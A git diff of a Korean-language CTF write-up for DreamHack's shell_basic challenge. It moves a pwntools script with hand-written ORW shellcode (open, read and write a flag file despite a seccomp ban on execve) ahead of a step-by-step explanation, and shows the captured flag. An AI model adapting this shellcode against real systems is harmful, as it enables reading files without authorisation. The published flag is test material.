@@ -44,13 +44,55 @@ void main(int argc, char *argv[]) {
 - **`mmap(..., PROT_READ|PROT_WRITE|PROT_EXEC, ...)`** — 실행 가능한(RWX) 메모리 한 페이지를 잡는다. 여기에 올라간 바이트는 곧 코드로 실행될 수 있다.
 - `read`로 받은 입력을 이 페이지에 넣고, 함수 포인터 `sc`로 **그 입력을 그대로 실행**한다. 따라서 우리가 보낸 셸코드가 실행된다.
 
-### 3. ORW 셸코드 작성
+### 3. 익스플로잇 코드 — ORW 셸코드
 
-셸이 막혔으니 `/home/shell_basic/flag_name_is_loooooong` 파일을 **open → read → write** 순서로 처리하는 셸코드를 작성한다.
+셸이 막혔으니 `/home/shell_basic/flag_name_is_loooooong` 파일을 **open → read → write** 순서로 처리하는 셸코드를 작성한다. 익스플로잇은 이 어셈블리를 `asm()`으로 기계어로 바꿔 전송한다.
 
 <p align="center">
   <img src="assets/shell_basic/exploit_asm.png" width="520" alt="문자열을 스택에 쌓고 open/read/write syscall을 호출하는 ORW 셸코드" />
 </p>
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+context.arch = 'amd64'
+
+shellcode = '''
+    push 0x0
+    mov rax, 0x676e6f6f6f6f6f6f
+    push rax
+    mov rax, 0x6c5f73695f656d61
+    push rax
+    mov rax, 0x6e5f67616c662f63
+    push rax
+    mov rax, 0x697361625f6c6c65
+    push rax
+    mov rax, 0x68732f656d6f682f
+    push rax
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 2
+    syscall
+    mov rdi, rax
+    mov rsi, rsp
+    sub rsi, 0x30
+    mov rdx, 0x30
+    mov rax, 0x0
+    syscall
+    mov rdi, 1
+    mov rax, 0x1
+    syscall
+'''
+
+p = remote('host3.dreamhack.games', 10169)   # 현재 문제 화면의 포트
+p.sendafter(b'shellcode: ', asm(shellcode))
+print(p.recvall(timeout=3).decode(errors='ignore'))
+```
+
+아래는 이 셸코드가 문자열을 어떻게 올리고 open/read/write를 어떤 순서로 호출하는지 네 부분으로 나눠 본 것이다.
+
+### 4. ORW 셸코드 설명
 
 **(1) 파일 경로 문자열을 스택에 쌓기**
 
@@ -97,47 +139,7 @@ syscall           ; rsi(버퍼)·rdx(0x30)는 read 때 값 그대로 재사용
 
 read로 버퍼에 담아만 두면 눈에 보이지 않으므로, 같은 버퍼를 **stdout(fd 1)로 write**해서 플래그를 화면에 뿌린다. `rsi`·`rdx`는 앞 단계 값이 그대로 남아 있어 다시 세팅하지 않는다.
 
-익스플로잇은 이 어셈블리를 `asm()`으로 기계어로 바꿔 전송한다.
-
-```python
-#!/usr/bin/env python3
-from pwn import *
-context.arch = 'amd64'
-
-shellcode = '''
-    push 0x0
-    mov rax, 0x676e6f6f6f6f6f6f
-    push rax
-    mov rax, 0x6c5f73695f656d61
-    push rax
-    mov rax, 0x6e5f67616c662f63
-    push rax
-    mov rax, 0x697361625f6c6c65
-    push rax
-    mov rax, 0x68732f656d6f682f
-    push rax
-    mov rdi, rsp
-    xor rsi, rsi
-    xor rdx, rdx
-    mov rax, 2
-    syscall
-    mov rdi, rax
-    mov rsi, rsp
-    sub rsi, 0x30
-    mov rdx, 0x30
-    mov rax, 0x0
-    syscall
-    mov rdi, 1
-    mov rax, 0x1
-    syscall
-'''
-
-p = remote('host3.dreamhack.games', 10169)   # 현재 문제 화면의 포트
-p.sendafter(b'shellcode: ', asm(shellcode))
-print(p.recvall(timeout=3).decode(errors='ignore'))
-```
-
-### 4. shellcraft로 더 간단하게
+### 5. shellcraft로 더 간단하게
 
 위 (2)~(4)의 open/read/write 과정은 pwntools의 `shellcraft`로 직접 짜지 않고 자동 생성할 수 있다.
 
@@ -167,7 +169,7 @@ p.interactive()
 
 `shellcraft.open/read/write`가 3절에서 손으로 쓴 것과 같은 ORW 셸코드를 대신 만들어 준다. 경로만 넣으면 되므로 훨씬 간단하다.
 
-### 5. 실행 결과
+### 6. 실행 결과
 
 셸코드를 보내면 파일을 열어 읽은 내용이 그대로 출력되고, 그 안에서 FLAG를 확인한다.
 
@@ -187,7 +189,7 @@ DH{ca562d7cf1db6c55cb11c4ec350a3c0b}
 
 위 값을 DreamHack 문제 페이지의 FLAG 입력란에 붙여 넣어 제출한다.
 
-### 6. 정리
+### 7. 정리
 
 - `execve`/`execveat`가 seccomp로 봉인되어 셸을 띄울 수 없을 때는, 플래그 파일을 **open → read → write(ORW)**로 직접 읽어 출력한다.
 - 파일 경로 문자열은 레지스터가 아니라 **스택(메모리)에 쌓고, 그 주소(`rsp`)를 넘긴다.** open이 돌려준 fd(`rax`)는 read의 fd로 이어지고, read가 채운 버퍼를 그대로 write해 화면에 뿌린다.
